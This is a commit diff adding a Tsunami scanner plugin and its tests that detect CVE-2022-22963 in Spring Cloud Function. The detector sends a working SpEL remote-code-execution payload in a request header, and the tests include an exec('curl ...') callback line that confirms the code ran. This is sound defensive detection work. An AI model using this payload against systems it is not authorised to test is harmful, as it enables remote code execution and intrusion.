54a2c2aea98d4436a3ee904bcc8b8f7f12004ddf
Nghi Tran <nghi@google.com>
2023-05-16 17:03:10 -0700

    Recreate CVE 202222963 detector in Python and set HTTP Client and Payload Generator for use as singleton.
    PiperOrigin-RevId: 532616097
    Change-Id: Id36ad87c1063ad32f45812273ade0c2605c6f04d

---
+++ py_plugins/spring_cloud_function_cve_202222963/spring_cloud_function_detector.py
@@ -0,0 +1,180 @@
+# Copyright 2022 Google LLC
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+"""A Tsunami plugin for detecting CVE-2022-22963."""
+import time
+from absl import logging
+from google3.google.protobuf import timestamp_pb2
+from google3.third_party.java_src.tsunami.plugin_server.py import tsunami_plugin
+from google3.third_party.java_src.tsunami.plugin_server.py.common.data import network_endpoint_utils
+from google3.third_party.java_src.tsunami.plugin_server.py.common.data import network_service_utils
+from google3.third_party.java_src.tsunami.plugin_server.py.common.net.http.http_client import HttpClient
+from google3.third_party.java_src.tsunami.plugin_server.py.common.net.http.http_headers import HttpHeaders
+from google3.third_party.java_src.tsunami.plugin_server.py.common.net.http.http_request import HttpRequest
+from google3.third_party.java_src.tsunami.plugin_server.py.plugin.payload.payload_generator import PayloadGenerator
+from google3.third_party.java_src.tsunami.proto import detection_pb2
+from google3.third_party.java_src.tsunami.proto import payload_generator_pb2 as pg
+from google3.third_party.java_src.tsunami.proto import plugin_representation_pb2
+from google3.third_party.java_src.tsunami.proto import vulnerability_pb2
+
+
+_VULN_PATH = 'functionRouter'
+_VULN_HEADER = 'spring.cloud.function.routing-expression'
+_VULN_DESCRIPTION = (
+    'In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported'
+    ' versions, when using routing functionality it is possible for a user to'
+    ' provide a specially crafted SpEL as a routing-expression that may result'
+    ' in remote code execution and access to local resources.'
+)
+_SLEEP_TIME_SEC = 20
+
+
+class Cve202222963Detector(tsunami_plugin.VulnDetector):
+  """A TsunamiPlugin that detects RCE on the Spring Cloud Function target."""
+
+  def __init__(
+      self, http_client: HttpClient, payload_generator: PayloadGenerator
+  ):
+    self.http_client = http_client
+    self.payload_generator = payload_generator
+
+  def GetPluginDefinition(self) -> tsunami_plugin.PluginDefinition:
+    """Defines the PluginDefinition for Cve202222963Detector.
+
+    Returns:
+      The PluginDefinition used for the Tsunami engine to identify this plugin.
+    """
+    return tsunami_plugin.PluginDefinition(
+        info=plugin_representation_pb2.PluginInfo(
+            type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
+            name='Cve202222963VulnDetector',
+            version='1.0',
+            description=_VULN_DESCRIPTION,
+            author='threedr3am (qiaoer1320@gmail.com)',
+        )
+    )
+
+  def Detect(
+      self,
+      target: tsunami_plugin.TargetInfo,
+      matched_services: list[tsunami_plugin.NetworkService],
+  ) -> tsunami_plugin.DetectionReportList:
+    """Run detection logic for the Spring Cloud Function target.
+
+    Args:
+      target: TargetInfo about Spring Cloud Function.
+      matched_services: A list of network services whose vulnerabilities could
+        be detected by this plugin. "rtsp" for example would be on this list.
+
+    Returns:
+      A tsunami_plugin.DetectionReportList for all the vulnerabilities of the
+      scanning target.d
+    """
+    logging.info('Cve202222963Detector starts detecting.')
+    vulnerable_services = [
+        s for s in matched_services if self._IsSupportedService(s)
+    ]
+
+    return detection_pb2.DetectionReportList(
+        detection_reports=[
+            self._BuildDetectionReport(target, service)
+            for service in vulnerable_services
+            if self._IsServiceVulnerable(service)
+        ]
+    )
+
+  def _IsSupportedService(
+      self, network_service: tsunami_plugin.NetworkService
+  ) -> bool:
+    """Check if network service is a web service or an unknown service."""
+    return (
+        not network_service.service_name
+        or network_service_utils.is_web_service(network_service)
+        or network_service_utils.get_service_name(network_service) == 'unknown'
+        or network_service_utils.get_service_name(network_service) == 'rtsp'
+    )
+
+  def _IsServiceVulnerable(
+      self, network_service: tsunami_plugin.NetworkService
+  ) -> bool:
+    """Check if network service may result in RCE."""
+    config = pg.PayloadGeneratorConfig(
+        vulnerability_type=pg.PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE,
+        interpretation_environment=pg.PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL,
+        execution_environment=pg.PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT,
+    )
+    payload = self.payload_generator.generate(config)
+    if not payload.get_payload_attributes().uses_callback_server:
+      return False
+    rce_command = "T(java.lang.Runtime).getRuntime().exec('{}')".format(
+        payload.get_payload()
+    )
+    url = self._BuildUrl(network_service)
+    request = (
+        HttpRequest.post(url)
+        .set_headers(
+            HttpHeaders.builder()
+            .add_header(_VULN_HEADER, rce_command)
+            .build()
+        )
+        .set_request_body(bytes('TSUNAMI', 'utf-8'))
+        .build()
+    )
+    try:
+      response = self.http_client.send(request, network_service)
+      time.sleep(_SLEEP_TIME_SEC)
+      return payload.check_if_executed(response.body)
+    except Exception:  # pylint: disable=broad-exception-caught
+      logging.exception('Unable to query %s', url)
+    return False
+
+  def _BuildUrl(self, network_service: tsunami_plugin.NetworkService) -> str:
+    """Build the vulnerable target path for RCE injection."""
+    url = ''
+    if network_service_utils.is_web_service(network_service):
+      url = network_service_utils.build_web_application_root_url(
+          network_service
+      )
+    else:
+      url = 'http://{}/'.format(
+          network_endpoint_utils.to_uri_authority(
+              network_service.network_endpoint
+          )
+      )
+    return url + _VULN_PATH
+
+  def _BuildDetectionReport(
+      self,
+      target: tsunami_plugin.TargetInfo,
+      vulnerable_service: tsunami_plugin.NetworkService,
+  ) -> detection_pb2.DetectionReport:
+    """Generate the detection report for all vulnerability findings."""
+    return detection_pb2.DetectionReport(
+        target_info=target,
+        network_service=vulnerable_service,
+        detection_timestamp=timestamp_pb2.Timestamp().GetCurrentTime(),
+        detection_status=detection_pb2.DetectionStatus.VULNERABILITY_VERIFIED,
+        vulnerability=vulnerability_pb2.Vulnerability(
+            main_id=vulnerability_pb2.VulnerabilityId(
+                publisher='TSUNAMI_COMMUNITY', value='CVE_2022_22963'
+            ),
+            severity=vulnerability_pb2.Severity.CRITICAL,
+            title=(
+                'Spring Cloud Function SpEL Code Injection RCE (CVE-2022-22963)'
+            ),
+            recommendation=(
+                'Users of affected versions should upgrade to 3.1.7, 3.2.3.'
+            ),
+            description=_VULN_DESCRIPTION,
+        ),
+    )
---
+++ py_plugins/spring_cloud_function_cve_202222963/spring_cloud_function_detector_test.py
@@ -0,0 +1,262 @@
+# Copyright 2022 Google LLC
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+"""Tests for SpringCloudFunctionDetector."""
+
+import unittest.mock as umock
+from absl.testing import absltest
+import requests_mock
+
+from google3.third_party.java_src.tsunami.plugin_server.py import tsunami_plugin
+from google3.third_party.java_src.tsunami.plugin_server.py.common.data import network_endpoint_utils
+from google3.third_party.java_src.tsunami.plugin_server.py.common.net.http.requests_http_client import RequestsHttpClientBuilder
+from google3.third_party.java_src.tsunami.plugin_server.py.plugin.payload.payload_generator import PayloadGenerator
+from google3.third_party.java_src.tsunami.plugin_server.py.plugin.payload.payload_secret_generator import PayloadSecretGenerator
+from google3.third_party.java_src.tsunami.plugin_server.py.plugin.payload.payload_utility import get_parsed_payload
+from google3.third_party.java_src.tsunami.plugin_server.py.plugin.tcs_client import TcsClient
+from google3.third_party.java_src.tsunami.proto import detection_pb2
+from google3.third_party.java_src.tsunami.proto import network_pb2
+from google3.third_party.java_src.tsunami.proto import network_service_pb2
+from google3.third_party.java_src.tsunami.proto import plugin_representation_pb2
+from google3.third_party.java_src.tsunami.proto import reconnaissance_pb2
+from google3.third_party.java_src.tsunami.proto import software_pb2
+from google3.third_party.java_src.tsunami.proto import vulnerability_pb2
+from google3.third_party.tsunami_plugins.py_plugins.spring_cloud_function_cve_202222963 import spring_cloud_function_detector
+from google3.third_party.tsunami_plugins.py_plugins.spring_cloud_function_cve_202222963.spring_cloud_function_detector import _VULN_DESCRIPTION
+from google3.third_party.tsunami_plugins.py_plugins.spring_cloud_function_cve_202222963.spring_cloud_function_detector import _VULN_PATH
+
+
+# Callback server
+_CBID = '04041e8898e739ca33a250923e24f59ca41a8373f8cf6a45a1275f3b'
+_IP_ADDRESS = '127.0.0.1'
+_PORT = 8000
+_SECRET = 'a3d9ed89deadbeef'
+_CALLBACK_URL = 'http://%s:%s/%s' % (_IP_ADDRESS, _PORT, _CBID)
+
+# Vulnerable target
+_TARGET_URL = 'vuln-target.com'
+_TARGET_PORT = 9001
+
+
+class SpringCloudFunctionDetectorTest(absltest.TestCase):
+  def setUp(self):
+    super().setUp()
+    # payload generator and client with callback
+    request_client = RequestsHttpClientBuilder().build()
+    self.psg = PayloadSecretGenerator()
+    self.psg.generate = umock.MagicMock(return_value=_SECRET)
+    callback_client = TcsClient(
+        _IP_ADDRESS, _PORT, _CALLBACK_URL, request_client
+    )
+    self.payloads = get_parsed_payload()
+    self.payload_generator = PayloadGenerator(
+        self.psg, self.payloads, callback_client
+    )
+    # detector
+    self.detector = spring_cloud_function_detector.Cve202222963Detector(
+        request_client, self.payload_generator
+    )
+
+  @requests_mock.mock()
+  def test_detect_vuln_target_with_callback_server_returns_vul(self, mock):
+    # response for vulnerable target
+    body = '1234'
+    mock.register_uri(
+        'POST',
+        'http://%s:%s/%s' % (_TARGET_URL, _TARGET_PORT, _VULN_PATH),
+        content=body.encode('utf-8'),
+        status_code=500,
+        request_headers={
+            'spring.cloud.function.routing-expression': (
+                "T(java.lang.Runtime).getRuntime().exec('curl %s')"
+                % _CALLBACK_URL
+            )
+        },
+    )
+    # response for callback server
+    body = '{ "has_dns_interaction":false, "has_http_interaction":true}'
+    mock.register_uri(
+        'GET',
+        '%s/?secret=%s' % (_CALLBACK_URL, _SECRET),
+        content=body.encode('utf-8'),
+    )
+    network_service = network_service_pb2.NetworkService(
+        network_endpoint=network_endpoint_utils.for_hostname_and_port(
+            _TARGET_URL, _TARGET_PORT
+        ),
+        transport_protocol=network_pb2.TransportProtocol.TCP,
+        software=software_pb2.Software(name='http'),
+        service_name='http',
+    )
+    target_info = reconnaissance_pb2.TargetInfo(
+        network_endpoints=[network_service.network_endpoint]
+    )
+    detection_reports = self.detector.Detect(target_info, [network_service])
+    self.assertEqual(
+        detection_pb2.DetectionReport(
+            target_info=target_info,
+            network_service=network_service,
+            detection_status=detection_pb2.VULNERABILITY_VERIFIED,
+            vulnerability=vulnerability_pb2.Vulnerability(
+                main_id=vulnerability_pb2.VulnerabilityId(
+                    publisher='TSUNAMI_COMMUNITY', value='CVE_2022_22963'
+                ),
+                severity=vulnerability_pb2.CRITICAL,
+                title=(
+                    'Spring Cloud Function SpEL Code Injection RCE'
+                    ' (CVE-2022-22963)'
+                ),
+                recommendation=(
+                    'Users of affected versions should upgrade to 3.1.7, 3.2.3.'
+                ),
+                description=_VULN_DESCRIPTION,
+            ),
+        ),
+        detection_reports.detection_reports[0],
+    )
+
+  @requests_mock.mock()
+  def test_detect_unknown_service_with_callback_server_returns_vul(self, mock):
+    # response for vulnerable target
+    body = '1234'
+    mock.register_uri(
+        'POST',
+        'http://%s:%s/%s' % (_TARGET_URL, _TARGET_PORT, _VULN_PATH),
+        content=body.encode('utf-8'),
+        status_code=500,
+        request_headers={
+            'spring.cloud.function.routing-expression': (
+                "T(java.lang.Runtime).getRuntime().exec('curl %s')"
+                % _CALLBACK_URL
+            )
+        },
+    )
+    # response for callback server
+    body = '{ "has_dns_interaction":false, "has_http_interaction":true}'
+    mock.register_uri(
+        'GET',
+        '%s/?secret=%s' % (_CALLBACK_URL, _SECRET),
+        content=body.encode('utf-8'),
+    )
+    network_service = network_service_pb2.NetworkService(
+        network_endpoint=network_endpoint_utils.for_hostname_and_port(
+            _TARGET_URL, _TARGET_PORT
+        ),
+        transport_protocol=network_pb2.TransportProtocol.TCP,
+        software=software_pb2.Software(name='http'),
+    )
+    target_info = reconnaissance_pb2.TargetInfo(
+        network_endpoints=[network_service.network_endpoint]
+    )
+    detection_reports = self.detector.Detect(target_info, [network_service])
+    self.assertEqual(
+        detection_pb2.DetectionReport(
+            target_info=target_info,
+            network_service=network_service,
+            detection_status=detection_pb2.VULNERABILITY_VERIFIED,
+            vulnerability=vulnerability_pb2.Vulnerability(
+                main_id=vulnerability_pb2.VulnerabilityId(
+                    publisher='TSUNAMI_COMMUNITY', value='CVE_2022_22963'
+                ),
+                severity=vulnerability_pb2.CRITICAL,
+                title=(
+                    'Spring Cloud Function SpEL Code Injection RCE'
+                    ' (CVE-2022-22963)'
+                ),
+                recommendation=(
+                    'Users of affected versions should upgrade to 3.1.7, 3.2.3.'
+                ),
+                description=_VULN_DESCRIPTION,
+            ),
+        ),
+        detection_reports.detection_reports[0],
+    )
+
+  @requests_mock.mock()
+  def test_detect_healthy_target_with_callback_server_returns_empty(self, mock):
+    # response for vulnerable target
+    body = '1234'
+    mock.register_uri(
+        'POST',
+        'http://%s:%s/%s' % (_TARGET_URL, _TARGET_PORT, _VULN_PATH),
+        content=body.encode('utf-8'),
+        status_code=200,
+    )
+    # response for callback server
+    mock.register_uri(
+        'GET', '%s/?secret=%s' % (_CALLBACK_URL, _SECRET), status_code=404
+    )
+    network_service = network_service_pb2.NetworkService(
+        network_endpoint=network_endpoint_utils.for_hostname_and_port(
+            _TARGET_URL, _TARGET_PORT
+        ),
+        transport_protocol=network_pb2.TransportProtocol.TCP,
+        software=software_pb2.Software(name='http'),
+        service_name='http',
+    )
+    target_info = reconnaissance_pb2.TargetInfo(
+        network_endpoints=[network_service.network_endpoint]
+    )
+    detection_reports = self.detector.Detect(target_info, [network_service])
+    self.assertEmpty(detection_reports.detection_reports)
+
+  @requests_mock.mock()
+  def test_detect_vuln_target_with_callback_server_returns_empty(self, mock):
+    # detector without callback
+    disabled_client = TcsClient('', 0, '', RequestsHttpClientBuilder().build())
+    self.detector.payload_generator = PayloadGenerator(
+        self.psg, self.payloads, disabled_client
+    )
+    # response for vulnerable target
+    body = '1234'
+    mock.register_uri(
+        'POST',
+        'http://%s:%s/%s' % (_TARGET_URL, _TARGET_PORT, _VULN_PATH),
+        content=body.encode('utf-8'),
+        status_code=200,
+    )
+    # response for callback server
+    mock.register_uri(
+        'GET', '%s/?secret=%s' % (_CALLBACK_URL, _SECRET), status_code=404
+    )
+    network_service = network_service_pb2.NetworkService(
+        network_endpoint=network_endpoint_utils.for_hostname_and_port(
+            _TARGET_URL, _TARGET_PORT
+        ),
+        transport_protocol=network_pb2.TransportProtocol.TCP,
+        software=software_pb2.Software(name='http'),
+        service_name='http',
+    )
+    target_info = reconnaissance_pb2.TargetInfo(
+        network_endpoints=[network_service.network_endpoint]
+    )
+    detection_reports = self.detector.Detect(target_info, [network_service])
+    self.assertEmpty(detection_reports.detection_reports)
+
+  def test_get_plugin_definition_returns_plugin_definition(self):
+    self.assertEqual(
+        tsunami_plugin.PluginDefinition(
+            info=plugin_representation_pb2.PluginInfo(
+                type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
+                name='Cve202222963VulnDetector',
+                version='1.0',
+                description=_VULN_DESCRIPTION,
+                author='threedr3am (qiaoer1320@gmail.com)',
+            )
+        ),
+        self.detector.GetPluginDefinition(),
+    )
+
+
+if __name__ == '__main__':
+  absltest.main()
